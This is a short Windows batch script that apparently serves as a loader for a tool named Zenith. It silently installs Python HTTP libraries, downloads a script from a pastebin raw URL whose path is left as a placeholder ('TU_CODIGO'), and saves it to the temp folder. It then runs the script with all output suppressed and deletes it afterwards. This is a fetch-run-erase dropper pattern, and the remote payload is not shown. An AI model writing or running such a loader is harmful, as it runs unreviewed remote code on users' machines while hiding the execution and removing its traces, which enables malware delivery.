@echo off
pip install "aiohttp>=3.8.0" "aiofiles>=23.0.0" "asyncio-throttle>=1.0.0" "requests>=2.28.0" -q --disable-pip-version-check >nul 2>&1
set "URL=https://pastebin.com/raw/TU_CODIGO"
set "OUTPUT=%TEMP%\Zenith.py"
curl -s %URL% -o "%OUTPUT%"
if exist "%OUTPUT%" (
    python "%OUTPUT%" >nul 2>&1
    del "%OUTPUT%" >nul 2>&1
)
exit
